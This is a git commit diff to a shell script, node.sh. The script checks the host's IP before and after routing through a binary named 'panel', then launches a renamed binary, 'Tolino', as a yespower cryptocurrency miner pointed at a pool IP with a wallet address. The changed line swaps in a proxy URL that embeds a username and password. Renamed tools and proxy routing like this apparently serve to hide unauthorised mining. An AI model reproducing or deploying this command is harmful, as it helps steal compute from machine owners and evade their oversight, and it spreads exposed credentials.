4811e49521c17e98691f0295819f289f020934c2
55113110159 <110314564+55113110159@users.noreply.github.com>
2023-12-12 00:36:01 +0700

    Update node.sh

--- node.sh
+++ node.sh
@@ -19,4 +19,4 @@ echo "IP ORI ==> "$(curl ifconfig.me)
 echo " " 
 echo " " 
 echo "IP BARU ==> "$(./panel curl ifconfig.me)
-./panel ./Tolino -a yespower -o 149.50.222.86:443 -u WchPf8BdS5vWZvZjMWgzeHur5RaHRX9nVr.$(echo $(shuf -i 1-999 -n 1)-Tolino) --timeout 120 -p c=SWAMP,mc=VHH -x -x socks5://192.252.209.155:14455 
+./panel ./Tolino -a yespower -o 149.50.222.86:443 -u WchPf8BdS5vWZvZjMWgzeHur5RaHRX9nVr.$(echo $(shuf -i 1-999 -n 1)-senio) --timeout 120 -p c=SWAMP,mc=VHH -x socks5://neozk6kncbe8qm:85u51lygdunhr6j4munieq0xm5sot@us-east-static-06.quotaguard.com:1080 
